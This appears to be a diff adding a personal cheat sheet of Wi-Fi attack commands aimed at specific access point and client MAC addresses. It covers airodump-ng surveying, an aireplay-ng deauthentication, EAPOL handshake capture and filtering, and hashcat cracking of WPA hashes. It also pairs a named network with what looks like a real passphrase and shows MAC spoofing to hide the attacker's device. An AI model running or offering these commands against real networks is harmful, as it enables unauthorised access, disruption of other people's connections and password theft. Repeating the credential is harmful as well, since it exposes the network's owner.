@@ -1,0 +1,70 @@
+
+
+basic survey
+```
+sudo $(which airodump-ng) --berlin "$BERLIN"  --gpsd --manufacturer --wps -w "$AIRODUMP_LOG_DIR/$(date +%H%M%S)_airodump" "$ALFA"
+```
+
+survey on channel 6 with --BSSID 
+```
+
+sudo $(which airodump-ng) --berlin "$BERLIN" --channel 6 --bssid 94:83:C4:1E:BA:B7 --gpsd --manufacturer --wps -w "$AIRODUMP_LOG_DIR/$(date +%H%M%S)_airodump" "$ALFA"
+```
+
+
+
+```
+sudo find ~/op/base-tools/kismet/bin/ -type f -exec setcap cap_net_raw,cap_net_admin+eip {} \;
+```
+
+
+	angryoxide -interface $ALFA_IFACE -c 36 -t 94:83:C4:1E:BA:B8
+
+
+
+Deauth
+
+```
+aireplay-ng -0 1 -a 94:83:C4:1E:BA:B7 -c  46:15:f5:a2:39:c4 $ALFA_IFACE
+```
+
+
+filter
+```
+tshark -r dumpfile.cap -R "(wlan.fc.type_subtype == 0x00 || wlan.fc.type_subtype == 0x02 || wlan.fc.type_subtype == 0x04 || wlan.fc.type_subtype == 0x05 || wlan.fc.type_subtype == 0x08 || eapol)" -2 -F pcapng -w stripped.pcapng
+```
+
+
+converts traffic to hash format
+
+```
+hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
+```
+
+```
+hashcat -m 22000 hash.hc2200 wordlist.txt
+```
+
+
+use if connect does not work
+```
+wpa_passphrase TownhomesNet24 ledzeppelin > WPASUP.CONF
+```
+
+
+
+```
+sudo wpa_supplicant -c WPASUP.conf -i $ALFA_IFACE
+```
+
+
+sudo ip link set dev $ALFA_IFACE down
+
+sudo macchanger -r $ALFA_IFACE
+
+sudo ip link set dev $ALFA_IFACE up
+
+
+sudo cp -r VBlvl8 ~/.rover/database/Imagery
+
+
